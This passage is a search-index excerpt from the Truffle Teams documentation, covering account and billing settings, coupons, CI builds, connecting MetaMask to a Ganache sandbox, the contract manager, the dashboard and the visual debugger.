If this account is still eligible for a trial, you'll be able to see and click on CLAIM TRIAL to claim your free 1 month pro trial. Claim a 1-month trial","title":"Claim a 1-month trial"},{"location":"docs/teams/account/invite-your-team.html","text":"Invite your team \u00b6 Inviting your team is as easy as inviting someone to your GitHub organization! Once your team has been added to your GitHub organization they can head on over to Truffle Teams, https://my.truffleteams.com , and sign up with their own GitHub account. For more information on creating accounts, check out the Creating an account section of our documentation.","title":"Teams | Invite your team"},{"location":"docs/teams/account/invite-your-team.html#invite-your-team","text":"Inviting your team is as easy as inviting someone to your GitHub organization! Once your team has been added to your GitHub organization they can head on over to Truffle Teams, https://my.truffleteams.com , and sign up with their own GitHub account. For more information on creating accounts, check out the Creating an account section of our documentation.","title":"Invite your team"},{"location":"docs/teams/account/manage-your-account.html","text":"Manage your account \u00b6 To manage and view your account settings, click on your username or GitHub avatar in the sidebar. Here you can update your plan and billing settings, view and/or manage users (depending on your permissions), and select repositories to use with CI providers of your choice. If you're apart of one or many organizations, a list of the the organizations you belong to will appear in the sidebar. You can click on the organization's name or or GitHub avatar to view and/or manage the organization's settings. Default settings view There will be three or four tabs to toggle between, depending on your permissions, on the settings page: Billing Builds Advanced Users (this tab will only appear if you are a part of an organization) Billing and plans \u00b6 When you sign up for Truffle Teams you are automatically enrolled in the Free plan. The Free plan comes with unlimited builds, monitoring of unlimited contracts, unlimited deployments to Sandboxes, testnets, and mainnet, and access to 1 Ganache sandbox. However, the Free plan is limited to public repositories. You can upgrade to Pro or enterprise plans at anytime. For a Pro plan, you'll get everything that comes with the Free plan plus private repositories and access to 3 Ganache Sandboxes. Try out Pro for a free month ! To upgrade to a Pro plan, click BILLING > UPGRADE and you'll be prompted to enter your billing information and payment method. If you're interested in our enterprise plan, contact us to get a tailored experience for you and your team. If you have subscribed to the Pro plan and for any reason would like to switch back to the Free plan, click BILLING then select the FREE plan by clicking SWITCH . You will continue to receive Pro services until the end of your billing period. Close your account \u00b6 If for any reason you would like to close your account, click on BILLING , scroll to the bottom of the page to the Close Account section. As a forewarning, if you close your account the data associated with your account will become inaccessible. If you're sure you want to close your account, go ahead and click I UNDERSTAND, CLOSE MY ACCOUNT . As a security measure, you'll be prompted to type in your account name and click CLOSE to confirm. Builds \u00b6 The BUILDS tab is where you can update specific repositories to use external CI providers instead of the Truffle Teams' internal CI test runner. For more information, check out our documentation on External CI . Advanced \u00b6 The advanced tab is where you can opt-in to early access features that are cutting-edge but potentially unstable. If you do decide to opt-in and discover any bugs, please let us know on our Truffle Teams Spectrum support channel ! Users \u00b6 The USERS tab will only appear if you are a part of an organization. Here you can find a list of users within the organization and their permissions. This information can be particularaly useful if you need to view or manage your teams permissions.","title":"Teams | Manage your account"},{"location":"docs/teams/account/manage-your-account.html#manage-your-account","text":"To manage and view your account settings, click on your username or GitHub avatar in the sidebar. Here you can update your plan and billing settings, view and/or manage users (depending on your permissions), and select repositories to use with CI providers of your choice. If you're apart of one or many organizations, a list of the the organizations you belong to will appear in the sidebar. You can click on the organization's name or or GitHub avatar to view and/or manage the organization's settings. Default settings view There will be three or four tabs to toggle between, depending on your permissions, on the settings page: Billing Builds Advanced Users (this tab will only appear if you are a part of an organization)","title":"Manage your account"},{"location":"docs/teams/account/manage-your-account.html#billing-and-plans","text":"When you sign up for Truffle Teams you are automatically enrolled in the Free plan. The Free plan comes with unlimited builds, monitoring of unlimited contracts, unlimited deployments to Sandboxes, testnets, and mainnet, and access to 1 Ganache sandbox. However, the Free plan is limited to public repositories. You can upgrade to Pro or enterprise plans at anytime. For a Pro plan, you'll get everything that comes with the Free plan plus private repositories and access to 3 Ganache Sandboxes. Try out Pro for a free month ! To upgrade to a Pro plan, click BILLING > UPGRADE and you'll be prompted to enter your billing information and payment method. If you're interested in our enterprise plan, contact us to get a tailored experience for you and your team. If you have subscribed to the Pro plan and for any reason would like to switch back to the Free plan, click BILLING then select the FREE plan by clicking SWITCH . You will continue to receive Pro services until the end of your billing period.","title":"Billing and plans"},{"location":"docs/teams/account/manage-your-account.html#close-your-account","text":"If for any reason you would like to close your account, click on BILLING , scroll to the bottom of the page to the Close Account section. As a forewarning, if you close your account the data associated with your account will become inaccessible. If you're sure you want to close your account, go ahead and click I UNDERSTAND, CLOSE MY ACCOUNT . As a security measure, you'll be prompted to type in your account name and click CLOSE to confirm.","title":"Close your account"},{"location":"docs/teams/account/manage-your-account.html#builds","text":"The BUILDS tab is where you can update specific repositories to use external CI providers instead of the Truffle Teams' internal CI test runner. For more information, check out our documentation on External CI .","title":"Builds"},{"location":"docs/teams/account/manage-your-account.html#advanced","text":"The advanced tab is where you can opt-in to early access features that are cutting-edge but potentially unstable. If you do decide to opt-in and discover any bugs, please let us know on our Truffle Teams Spectrum support channel !","title":"Advanced"},{"location":"docs/teams/account/manage-your-account.html#users","text":"The USERS tab will only appear if you are a part of an organization. Here you can find a list of users within the organization and their permissions. This information can be particularaly useful if you need to view or manage your teams permissions.","title":"Users"},{"location":"docs/teams/account/redeeming-a-coupon.html","text":"Redeeming a coupon \u00b6 Redeeming a coupon for a Truffle Teams paid subscription is different for new and existing subscriptions. Please be sure to read the instructions carefully to make sure your coupon is applied correctly. If at any point you need some help, please don't hesitate to ask us a question . New Subscriptions Existing Subscriptions New Subscriptions \u00b6 Before you can continue below, you'll need to make sure you have created an account and added at least one repository for the GitHub user/organization you'd like to apply your coupon code for. Once you've made sure the account you'd like to apply the coupon for exists, navigate to the settings page. You can also navigate there by clicking on your avatar/username in the sidebar. Next, click on the GitHub user or organization in the sidebar that you'd like to redeem the coupon for. Verify you are on the correct account by looking at the application header that says Settings for ... Next, verify you're on the BILLING tab. You should see that FREE is your current plan like the below picture; if it is not, please follow the instructions in the existing subscriptions section. Press UPGRADE under the PRO plan. Confirm/update the Billing Email so that it is correct. This is the email that will receive receipts and failed payment notices. Press CONTINUE . Enter your location information and press Continue \u00bb . Click Add Coupon . Enter your unique one-time coupon code. Then click Add Coupon . You'll be redirected to the prior screen. It should show that your coupon has been applied. You can then checkout as normal with your Credit/Debit Card or PayPal account. You will not be charged today; this information will be used to renew your subscription after 1 month. After you finish checking out, you should see that PRO is now your current plan. Existing Subscriptions \u00b6 If you already have a paid subscription that you'd like to redeem the coupon towards your next billing cycle, please fill out the existing subscription coupon form . You will need to provide the account name you'd like to apply the coupon to. This is usually the GitHub user/organization name. For example, to apply a coupon for the https://github.com/trufflesuite/truffle repo, the account name would be trufflesuite . You can also go to https://my.truffleteams.com/#/settings and give the name of the account as it is written in the sidebar.","title":"Teams | Redeeming a coupon"},{"location":"docs/teams/account/redeeming-a-coupon.html#redeeming-a-coupon","text":"Redeeming a coupon for a Truffle Teams paid subscription is different for new and existing subscriptions. Please be sure to read the instructions carefully to make sure your coupon is applied correctly. If at any point you need some help, please don't hesitate to ask us a question . New Subscriptions Existing Subscriptions","title":"Redeeming a coupon"},{"location":"docs/teams/account/redeeming-a-coupon.html#new-subscriptions","text":"Before you can continue below, you'll need to make sure you have created an account and added at least one repository for the GitHub user/organization you'd like to apply your coupon code for. Once you've made sure the account you'd like to apply the coupon for exists, navigate to the settings page. You can also navigate there by clicking on your avatar/username in the sidebar. Next, click on the GitHub user or organization in the sidebar that you'd like to redeem the coupon for. Verify you are on the correct account by looking at the application header that says Settings for ... Next, verify you're on the BILLING tab. You should see that FREE is your current plan like the below picture; if it is not, please follow the instructions in the existing subscriptions section. Press UPGRADE under the PRO plan. Confirm/update the Billing Email so that it is correct. This is the email that will receive receipts and failed payment notices. Press CONTINUE . Enter your location information and press Continue \u00bb . Click Add Coupon . Enter your unique one-time coupon code. Then click Add Coupon . You'll be redirected to the prior screen. It should show that your coupon has been applied. You can then checkout as normal with your Credit/Debit Card or PayPal account. You will not be charged today; this information will be used to renew your subscription after 1 month. After you finish checking out, you should see that PRO is now your current plan.","title":"New Subscriptions"},{"location":"docs/teams/account/redeeming-a-coupon.html#existing-subscriptions","text":"If you already have a paid subscription that you'd like to redeem the coupon towards your next billing cycle, please fill out the existing subscription coupon form . You will need to provide the account name you'd like to apply the coupon to. This is usually the GitHub user/organization name. For example, to apply a coupon for the https://github.com/trufflesuite/truffle repo, the account name would be trufflesuite . You can also go to https://my.truffleteams.com/#/settings and give the name of the account as it is written in the sidebar.","title":"Existing Subscriptions"},{"location":"docs/teams/account/switching-accounts.html","text":"Switching accounts \u00b6 If you are currently logged in and would like to switch accounts, click LOGOUT in the sidebar. To login as a different user, please logout of GitHub and then login to the other GitHub account you would like to use. Once successfully logged into GitHub, head back to Truffle Teams and click LOGIN WITH GITHUB to sign in with the other account.","title":"Teams | Switching accounts"},{"location":"docs/teams/account/switching-accounts.html#switching-accounts","text":"If you are currently logged in and would like to switch accounts, click LOGOUT in the sidebar. To login as a different user, please logout of GitHub and then login to the other GitHub account you would like to use. Once successfully logged into GitHub, head back to Truffle Teams and click LOGIN WITH GITHUB to sign in with the other account.","title":"Switching accounts"},{"location":"docs/teams/builds/builds-overview.html","text":"Builds overview \u00b6 At it's core, Truffle Teams is a zero-configuration Continuous Integration (CI) platform that aims to support your development lifecycle. Any time code is pushed to a repository with Truffle Teams enabled, we automatically build and test code changes. As the build progresses, we provide you status updates and build output. When a build is run with Truffle Teams, we spin up a virtual environment and run a series of commands such as installing Truffle, cloning your repository, installing dependencies for your repository and more. To check out exactly what commands we run, check out the build output for any build by going to BUILDS > BUILD DETAILS . To learn how to trigger a build, check out the Starting builds section for more information. If you want or need a customizable CI solution, you can use an external CI provider such as Travis or Circle. For more information on how to set up an external provider, head over to our External CI documentation.","title":"Teams | Builds overview"},{"location":"docs/teams/builds/builds-overview.html#builds-overview","text":"At it's core, Truffle Teams is a zero-configuration Continuous Integration (CI) platform that aims to support your development lifecycle. Any time code is pushed to a repository with Truffle Teams enabled, we automatically build and test code changes. As the build progresses, we provide you status updates and build output. When a build is run with Truffle Teams, we spin up a virtual environment and run a series of commands such as installing Truffle, cloning your repository, installing dependencies for your repository and more. To check out exactly what commands we run, check out the build output for any build by going to BUILDS > BUILD DETAILS . To learn how to trigger a build, check out the Starting builds section for more information. If you want or need a customizable CI solution, you can use an external CI provider such as Travis or Circle. For more information on how to set up an external provider, head over to our External CI documentation.","title":"Builds overview"},{"location":"docs/teams/builds/external-ci.html","text":"External CI \u00b6 To enable external CI for a repository, navigate to your user or organization\u2019s settings page by clicking the user/organization's name or GitHub avatar. From there, click the BUILDS tab, then check the checkbox next to the repository of your choice. The BUILDS settings screen Now, when you navigate to BUILDS for that repository, for any new builds you can click on BUILD DETAILS to see a list of your GitHub-integrated build services, along with their respective build statuses. Note : For more detailed information on adding services to GitHub via their Marketplace, check out the About GitHub Marketplace section of the GitHub docs. Build with external CI enabled","title":"Teams | External CI"},{"location":"docs/teams/builds/external-ci.html#external-ci","text":"To enable external CI for a repository, navigate to your user or organization\u2019s settings page by clicking the user/organization's name or GitHub avatar. From there, click the BUILDS tab, then check the checkbox next to the repository of your choice. The BUILDS settings screen Now, when you navigate to BUILDS for that repository, for any new builds you can click on BUILD DETAILS to see a list of your GitHub-integrated build services, along with their respective build statuses. Note : For more detailed information on adding services to GitHub via their Marketplace, check out the About GitHub Marketplace section of the GitHub docs. Build with external CI enabled","title":"External CI"},{"location":"docs/teams/builds/restarting-builds.html","text":"Restarting builds \u00b6 If for whatever reason a build failed and you want to restart it, it is possible to manually retrigger the build by clicking RESTART BUILD next to the specific build on the BUILDS page. Note: RESTART BUILD will be disabled for any in progress builds or builds using an external CI provider (such as Travis CI or CircleCI) as you would have to restart the build through your external CI providers interface.","title":"Teams | Restarting builds"},{"location":"docs/teams/builds/restarting-builds.html#restarting-builds","text":"If for whatever reason a build failed and you want to restart it, it is possible to manually retrigger the build by clicking RESTART BUILD next to the specific build on the BUILDS page. Note: RESTART BUILD will be disabled for any in progress builds or builds using an external CI provider (such as Travis CI or CircleCI) as you would have to restart the build through your external CI providers interface.","title":"Restarting builds"},{"location":"docs/teams/builds/starting-builds.html","text":"Starting builds \u00b6 Builds will start automatically once a new commit is pushed to any branch of any repository added to Truffle Teams. The build will be queued in both Truffle Teams and on GitHub with the commit itself. To see the build as it progresses, click on BUILDS . Note : Truffle Teams will only build repositories who have a Truffle project at the root of the repository. It looks for a truffle-config.js or truffle.js config in the root directory before building. Read more in the Configuration docs . For more details on a specific build, feel free to click on BUILD DETAILS for any build in the list.","title":"Teams | Starting builds"},{"location":"docs/teams/builds/starting-builds.html#starting-builds","text":"Builds will start automatically once a new commit is pushed to any branch of any repository added to Truffle Teams. The build will be queued in both Truffle Teams and on GitHub with the commit itself. To see the build as it progresses, click on BUILDS . Note : Truffle Teams will only build repositories who have a Truffle project at the root of the repository. It looks for a truffle-config.js or truffle.js config in the root directory before building. Read more in the Configuration docs . For more details on a specific build, feel free to click on BUILD DETAILS for any build in the list.","title":"Starting builds"},{"location":"docs/teams/contract-manager/connecting-to-a-sandbox.html","text":"Connecting to a sandbox \u00b6 Note : The contract manager is currently available as part of our Early Access program, which when enabled gives you access to cutting-edge and potentially unstable features. It requires opting-in; navigate to your account settings by clicking on your username or GitHub avatar in the sidebar. Click ADVANCED and choose Early Access . Please note, this section of the documentation assumes that you have already created a sandbox and deployed your contracts to the sandbox. If you need help getting started with sandboxes and deployments to sandboxes, please check out the creating a sandbox section and the deploying to a sandbox section for more details. If you deployed your contract to a sandbox and would like to interact with it using the contract manager, you'll need to have your MetaMask connected to your sandbox instance. To connect MetaMask to your sandbox, you'll need the RPC URL and the generated mnemonic. Navigate to SANDBOXES and click on VIEW/EDIT of the sandbox you deployed to. Copy the Mnemonic , open your MetaMask browser extension, and select Import using account seed phrase . Sandbox view/edit modal and MetaMask wallet setup A new tab will open for restoring your account with a seed phrase/mnemonic; paste the mnemonic into the Wallet Seed text box, create a password, and click Restore . Restore MetaMask account with seed phrase Once you have successfully logged into MetaMask via seed phrase, next you'll need to create a custom RPC using the sandbox RPC URL. Copy the RPC URL , open your MetaMask browser extension, click on the Network dropdown list, select Custom RPC from the bottom of the list. Enter a network name, paste the RPC URL into the New RPC URL text box, enter in Ganache's Chain ID: 1337 , and any other relevant information, and click Save . Create Custom RPC in MetaMask If you click on the MetaMask logo it'll take you back to your account details where you should see a test account with 100 ETH. Now you're connected to MetaMask and can head over to the contract manager to interact with your contract. Navigate to the DEPLOYMENTS page, toggle to TABLE view, and select the deployment from your list of deployments. On the chosen deployment page, under the CONTRACTS tab, you can chose a contract to interact with by clicking on MANAGE . A MetaMask pop-up will appear asking you to select an account to use, choose which account to use from the list and click Next , and finally accept the permissions by clicking Connect . You've successfully selected an account, now you're ready to interact with the contract manager! To learn more on interacting with contracts, head over to the Interacting with functions section.","title":"Teams | Connecting to a sandbox"},{"location":"docs/teams/contract-manager/connecting-to-a-sandbox.html#connecting-to-a-sandbox","text":"Note : The contract manager is currently available as part of our Early Access program, which when enabled gives you access to cutting-edge and potentially unstable features. It requires opting-in; navigate to your account settings by clicking on your username or GitHub avatar in the sidebar. Click ADVANCED and choose Early Access . Please note, this section of the documentation assumes that you have already created a sandbox and deployed your contracts to the sandbox. If you need help getting started with sandboxes and deployments to sandboxes, please check out the creating a sandbox section and the deploying to a sandbox section for more details. If you deployed your contract to a sandbox and would like to interact with it using the contract manager, you'll need to have your MetaMask connected to your sandbox instance. To connect MetaMask to your sandbox, you'll need the RPC URL and the generated mnemonic. Navigate to SANDBOXES and click on VIEW/EDIT of the sandbox you deployed to. Copy the Mnemonic , open your MetaMask browser extension, and select Import using account seed phrase . Sandbox view/edit modal and MetaMask wallet setup A new tab will open for restoring your account with a seed phrase/mnemonic; paste the mnemonic into the Wallet Seed text box, create a password, and click Restore . Restore MetaMask account with seed phrase Once you have successfully logged into MetaMask via seed phrase, next you'll need to create a custom RPC using the sandbox RPC URL. Copy the RPC URL , open your MetaMask browser extension, click on the Network dropdown list, select Custom RPC from the bottom of the list. Enter a network name, paste the RPC URL into the New RPC URL text box, enter in Ganache's Chain ID: 1337 , and any other relevant information, and click Save . Create Custom RPC in MetaMask If you click on the MetaMask logo it'll take you back to your account details where you should see a test account with 100 ETH. Now you're connected to MetaMask and can head over to the contract manager to interact with your contract. Navigate to the DEPLOYMENTS page, toggle to TABLE view, and select the deployment from your list of deployments. On the chosen deployment page, under the CONTRACTS tab, you can chose a contract to interact with by clicking on MANAGE . A MetaMask pop-up will appear asking you to select an account to use, choose which account to use from the list and click Next , and finally accept the permissions by clicking Connect . You've successfully selected an account, now you're ready to interact with the contract manager! To learn more on interacting with contracts, head over to the Interacting with functions section.","title":"Connecting to a sandbox"},{"location":"docs/teams/contract-manager/contract-manager-overview.html","text":"Contract manager overview \u00b6 Note : The contract manager is currently available as part of our Early Access program, which when enabled gives you access to cutting-edge and potentially unstable features. It requires opting-in; navigate to your account settings by clicking on your username or GitHub avatar in the sidebar. Click ADVANCED and choose Early Access . The contract mananger provides a user-friendly interface for interacting with your deployed contract instances. It enables you to view the current state of a contract and interact with a contracts functions. Contract manager Getting started \u00b6 To use the contract manager, you must have a deployed contract instance. If you need help deploying a contract, check out the Creating a Deployment section to learn more. Once you've deployed your contract, navigate to the DEPLOYMENTS page, toggle to TABLE view, and select the deployment from your list of deployments. On the chosen deployment page, under the CONTRACTS tab, you can chose a contract to interact with by clicking on MANAGE . Once you've successfully navigated to the contract manager, you'll see two sections: State and Functions . The State section provides a quick glance at all of the public state variables in your contract. The Functions section allows you to interact with your deployed contract instance. To learn more on how to interact with your public contract functions, take a look at the Interacting with functions section.","title":"Teams | Contract manager overview"},{"location":"docs/teams/contract-manager/contract-manager-overview.html#contract-manager-overview","text":"Note : The contract manager is currently available as part of our Early Access program, which when enabled gives you access to cutting-edge and potentially unstable features. It requires opting-in; navigate to your account settings by clicking on your username or GitHub avatar in the sidebar. Click ADVANCED and choose Early Access . The contract mananger provides a user-friendly interface for interacting with your deployed contract instances. It enables you to view the current state of a contract and interact with a contracts functions. Contract manager","title":"Contract manager overview"},{"location":"docs/teams/contract-manager/contract-manager-overview.html#getting-started","text":"To use the contract manager, you must have a deployed contract instance. If you need help deploying a contract, check out the Creating a Deployment section to learn more. Once you've deployed your contract, navigate to the DEPLOYMENTS page, toggle to TABLE view, and select the deployment from your list of deployments. On the chosen deployment page, under the CONTRACTS tab, you can chose a contract to interact with by clicking on MANAGE . Once you've successfully navigated to the contract manager, you'll see two sections: State and Functions . The State section provides a quick glance at all of the public state variables in your contract. The Functions section allows you to interact with your deployed contract instance. To learn more on how to interact with your public contract functions, take a look at the Interacting with functions section.","title":"Getting started"},{"location":"docs/teams/contract-manager/interacting-with-functions.html","text":"Interacting with functions \u00b6 Note : The contract manager is currently available as part of our Early Access program, which when enabled gives you access to cutting-edge and potentially unstable features. It requires opting-in; navigate to your account settings by clicking on your username or GitHub avatar in the sidebar. Click ADVANCED and choose Early Access . Please note this section of the documentation assumes that you have already deployed a contract and navigated to the contract manager. If you have not done so, please take a look at the Contract manager overview for more details. To interact with a function, click on a function signature from the list of functions within the Functions section. If the function accepts parameters, you'll see an input box for each parameter. We accept valid YAML and/or JSON as inputs. Contract manager functions Working with structs as parameters \u00b6 There are two different ways to input a struct as a parameter: as an array of values or as objects with the keys being the names of the struct fields. For example, given this struct: struct Repository { string name ; string [ 2 ] branches ; } You can input the parameter as an array of values: [ \"truffle-teams\" , [ \"main\" , \"chore/update-readme\" ]]; Or you can input the parameter as an object: { name : \"truffle-teams\" , branches : [ \"main\" , \"chore/update-readme\" ] }","title":"Teams | Interacting with functions"},{"location":"docs/teams/contract-manager/interacting-with-functions.html#interacting-with-functions","text":"Note : The contract manager is currently available as part of our Early Access program, which when enabled gives you access to cutting-edge and potentially unstable features. It requires opting-in; navigate to your account settings by clicking on your username or GitHub avatar in the sidebar. Click ADVANCED and choose Early Access . Please note this section of the documentation assumes that you have already deployed a contract and navigated to the contract manager. If you have not done so, please take a look at the Contract manager overview for more details. To interact with a function, click on a function signature from the list of functions within the Functions section. If the function accepts parameters, you'll see an input box for each parameter. We accept valid YAML and/or JSON as inputs. Contract manager functions","title":"Interacting with functions"},{"location":"docs/teams/contract-manager/interacting-with-functions.html#working-with-structs-as-parameters","text":"There are two different ways to input a struct as a parameter: as an array of values or as objects with the keys being the names of the struct fields. For example, given this struct: struct Repository { string name ; string [ 2 ] branches ; } You can input the parameter as an array of values: [ \"truffle-teams\" , [ \"main\" , \"chore/update-readme\" ]]; Or you can input the parameter as an object: { name : \"truffle-teams\" , branches : [ \"main\" , \"chore/update-readme\" ] }","title":"Working with structs as parameters"},{"location":"docs/teams/dashboard/adding-a-deployment.html","text":"Adding a deployment \u00b6 To get started with the dashboard, first you will need to select a repository and deploy your DApp . Once you have a deployment available, you can select that deployment to monitor via the dashboard by clicking ADD DEPLOYMENT . Dashboard Page Before a Deployment is Added Once you have added a deployment to monitor, you will be taken to the main dashboard page where you can see at-a-glance information about your deployment. Dashboard Landing Page","title":"Teams | Adding a deployment"},{"location":"docs/teams/dashboard/adding-a-deployment.html#adding-a-deployment","text":"To get started with the dashboard, first you will need to select a repository and deploy your DApp . Once you have a deployment available, you can select that deployment to monitor via the dashboard by clicking ADD DEPLOYMENT . Dashboard Page Before a Deployment is Added Once you have added a deployment to monitor, you will be taken to the main dashboard page where you can see at-a-glance information about your deployment. Dashboard Landing Page","title":"Adding a deployment"},{"location":"docs/teams/dashboard/dashboard-overview.html","text":"Dashboard overview \u00b6 The Truffle Teams dashboard allows you to get at-a-glance information about the health of a deployed DApp such as a link to the commit which was deployed, the cost of your deployment, and transactions over time. To learn more and get started with the dashboard, head over to the Adding a deployment section of the dashboard documentation. Dashboard Feedback and Suggestions \u00b6 Dashboard is a new Truffle Teams feature and is in development. If you would like to suggest new features or other changes, please let us know on our community Spectrum channel.","title":"Teams | Dashboard overview"},{"location":"docs/teams/dashboard/dashboard-overview.html#dashboard-overview","text":"The Truffle Teams dashboard allows you to get at-a-glance information about the health of a deployed DApp such as a link to the commit which was deployed, the cost of your deployment, and transactions over time. To learn more and get started with the dashboard, head over to the Adding a deployment section of the dashboard documentation. Dashboard","title":"Dashboard overview"},{"location":"docs/teams/dashboard/dashboard-overview.html#feedback-and-suggestions","text":"Dashboard is a new Truffle Teams feature and is in development. If you would like to suggest new features or other changes, please let us know on our community Spectrum channel.","title":"Feedback and Suggestions"},{"location":"docs/teams/dashboard/switching-deployments.html","text":"Switching deployments \u00b6 As your DApp matures and changes, you may find you want to change the deployment you are monitoring with the dashboard. To do this, simply click the SWITCH DEPLOYMENT button at the upper right of the dashboard screen. Once you have opened the deploymemt choice modal, pick the deployment you wish to monitor. Note : If you are working on a DApp with a team of developers, changing the dashboard deployment will make the change for all developers on your team. Dashboard Deployment Choice Modal","title":"Teams | Switching deployments"},{"location":"docs/teams/dashboard/switching-deployments.html#switching-deployments","text":"As your DApp matures and changes, you may find you want to change the deployment you are monitoring with the dashboard. To do this, simply click the SWITCH DEPLOYMENT button at the upper right of the dashboard screen. Once you have opened the deploymemt choice modal, pick the deployment you wish to monitor. Note : If you are working on a DApp with a team of developers, changing the dashboard deployment will make the change for all developers on your team. Dashboard Deployment Choice Modal","title":"Switching deployments"},{"location":"docs/teams/debugger/debugger-overview.html","text":"Debugger overview \u00b6 Note : The debugger is currently available as part of our Early Access program, which when enabled gives you access to cutting-edge and potentially unstable features. It requires opting-in; navigate to your account settings by clicking on your username or GitHub avatar in the sidebar. Click ADVANCED and choose Early Access . Truffle Teams comes with a powerful visual debugger that enables you to replay and systematically step through the transactions made against your project's contracts. Debugger","title":"Teams | Debugger overview"},{"location":"docs/teams/debugger/debugger-overview.html#debugger-overview","text":"Note : The debugger is currently available as part of our Early Access program, which when enabled gives you access to cutting-edge and potentially unstable features. It requires opting-in; navigate to your account settings by clicking on your username or GitHub avatar in the sidebar. Click ADVANCED and choose Early Access . Truffle Teams comes with a powerful visual debugger that enables you to replay and systematically step through the transactions made against your project's contracts. Debugger","title":"Debugger overview"},{"location":"docs/teams/debugger/debugging-a-transaction.html","text":"Debugging a transaction \u00b6 Note : The debugger is currently available as part of our Early Access program, which when enabled gives you access to cutting-edge and potentially unstable features. It requires opting-in; navigate to your account settings by clicking on your username or GitHub avatar in the sidebar. Click ADVANCED and choose Early Access . Note : Truffle Teams currently only allows you to debug transactions on Ganache sandboxes . Support for public networks (such as the G\u00f6rli testnet or mainnet ) will be available soon. The debugger is accessed from the DEPLOYMENTS page. From here, select the deployment which included the contracts that received the transaction that you are looking to debug. In the example screenshot below, this is deployment-01 . The Truffle Teams Deployments screen. At this screen, you can either click MONITOR to the right of the contract to view transactions sent solely to that contract address, or the TRANSACTIONS tab to view all the transactions associated with the entire deployment. The Truffle Teams Deployment screen. Assuming your contract(s) have received one or more transactions you will now see a list similar to the screenshot below. The Truffle Teams Transaction Monitoring screen. The debugger can be started by clicking on the DEBUG button located on the right-hand-side of a given transaction.","title":"Teams | Debugging a transaction"},{"location":"docs/teams/debugger/debugging-a-transaction.html#debugging-a-transaction","text":"Note : The debugger is currently available as part of our Early Access program, which when enabled gives you access to cutting-edge and potentially unstable features. It requires opting-in; navigate to your account settings by clicking on your username or GitHub avatar in the sidebar. Click ADVANCED and choose Early Access . Note : Truffle Teams currently only allows you to debug transactions on Ganache sandboxes . Support for public networks (such as the G\u00f6rli testnet or mainnet ) will be available soon. The debugger is accessed from the DEPLOYMENTS page. From here, select the deployment which included the contracts that received the transaction that you are looking to debug. In the example screenshot below, this is deployment-01 . The Truffle Teams Deployments screen. At this screen, you can either click MONITOR to the right of the contract to view transactions sent solely to that contract address, or the TRANSACTIONS tab to view all the transactions associated with the entire deployment. The Truffle Teams Deployment screen. Assuming your contract(s) have received one or more transactions you will now see a list similar to the screenshot below. The Truffle Teams Transaction Monitoring screen. The debugger can be started by clicking on the DEBUG button located on the right-hand-side of a given transaction.","title":"Debugging a transaction"},{"location":"docs/teams/debugger/using-the-debugger.html","text":"Using the debugger \u00b6 Note : The debugger is currently available as part of our Early Access program, which when enabled gives you access to cutting-edge and potentially unstable features. It requires opting-in; navigate to your account settings by clicking on your username or GitHub avatar in the sidebar. Click ADVANCED and choose Early Access . In this section we'll explore both the various elements of the debugger's user interface and steps invovled in actually debugging a transaction. Let's explore an example of the Truffle Teams debugger interface, wherein a simple ERC721 token implementation is being debugged. The Truffle Teams Debugger Interface. The first thing to note is the transaction hash ( 0x82f668a... ) in the page header. The header includes a visual representation of whether the transaction ultimately succeeded or failed . This is a useful reference as it allows you to preemptively know whether to expect a status message when execution completes. More on this in the Status Messages section. Debugger control palette \u00b6 From within the debugger interface you'll find the debugger's control palette. The Truffle Teams Debugger Control Palette. From left to right, the controls, with a description of their associated action, are as follows. Note that you can also hover a control to display its associated name. Note that the brackets contain the corresponding keyboard shortcuts for each command. Continue - continue until the next breakpoint is reached or the last line is executed (\"c\" or \"F8\") Step Over - steps over the current line (\"o\" or \"F10\") Step Into - steps into the function call or contract creation currently being evaluated (\"i\" or \"F11\") Step Out - steps out of the currently running function (\"u\" or \"Shift+F11\") Restart - restarts the debugger session (\"r\") Source files \u00b6 The source files that will be accessed as part of the transactions execution path will be represented by tabs with the contract file names. It's worth noting that it's likely your project may contain more files than are displayed here. The Truffle Teams Debugger Source File Tabs. There are two noteworthy visual cues with the debugger tabs. The first is that of an \"open tab\", which means that you're looking at the file's code below and is represented with a light green background. The second is that of \"active tab\" which is represented by an orange circle which indicates that the debugger is currently paused within this file. As you use the debugger's controls to step through a transaction you will likely see the active tab update. Note that the open tab will also update when the code steps into it. Debugger source viewport \u00b6 As the core of the Truffle Teams Debugger is the source viewport. This is a read-only display of the code that the transaction will be stepping through as part of its execution. The Truffle Teams Debugger Source Viewport. The main thing to note is the active line which is highlighted in yellow. As your step through your transaction this will update accordingly. Debugger variable inspector \u00b6 The variable inspector shows the variable values for the current transaction execution context, including contract state, local function, and global variables. The inspector uses a tree-like explorer enabling you to drill down by clicking on a given branch, represented by the green right-facing caret icon . The Truffle Teams Debugger Variable Inspector. Breakpoints \u00b6 Located in the lower right corner of the screen is the breakpoint tray. Breakpoints are added to the tray by clicking on a given line number or just to the left in the line's \"gutter\". They can subsequently be removed by clicking in the same location or on the circular cross to the right of the breakpoint entry in the tray itself. The Truffle Teams Debugger Breakpoints. Functionally, breakpoints will cause code execution to stop (or break) upon being reached. At this point it's common to inspect state via the Variable Inspector or continue stepping through to ensure your code is behaving as expected or when tracking down a bug. Lastly, note that clicking on a given breakpoint within the tray will jump you to the corresponding tab and line. This is particularly useful when navigating more complex contracts that comprise of multiple files. Status Messages \u00b6 If your transaction's execution ultimately fails, a banner appear after the REVERT happens. An associated status message or reason string will be shown if one exists. The Truffle Teams Debugger Status Message. As shown in the example, the transaction failed with the ERC721: token already minted reason string.","title":"Teams | Using the debugger"},{"location":"docs/teams/debugger/using-the-debugger.html#using-the-debugger","text":"Note : The debugger is currently available as part of our Early Access program, which when enabled gives you access to cutting-edge and potentially unstable features. It requires opting-in; navigate to your account settings by clicking on your username or GitHub avatar in the sidebar. Click ADVANCED and choose Early Access . In this section we'll explore both the various elements of the debugger's user interface and steps invovled in actually debugging a transaction. Let's explore an example of the Truffle Teams debugger interface, wherein a simple ERC721 token implementation is being debugged. The Truffle Teams Debugger Interface. The first thing to note is the transaction hash ( 0x82f668a... ) in the page header. The header includes a visual representation of whether the transaction ultimately succeeded or failed . This is a useful reference as it allows you to preemptively know whether to expect a status message when execution completes. More on this in the Status Messages section.","title":"Using the debugger"},{"location":"docs/teams/debugger/using-the-debugger.html#debugger-control-palette","text":"From within the debugger interface you'll find the debugger's control palette. The Truffle Teams Debugger Control Palette. From left to right, the controls, with a description of their associated action, are as follows. Note that you can also hover a control to display its associated name. Note that the brackets contain the corresponding keyboard shortcuts for each command. Continue - continue until the next breakpoint is reached or the last line is executed (\"c\" or \"F8\") Step Over - steps over the current line 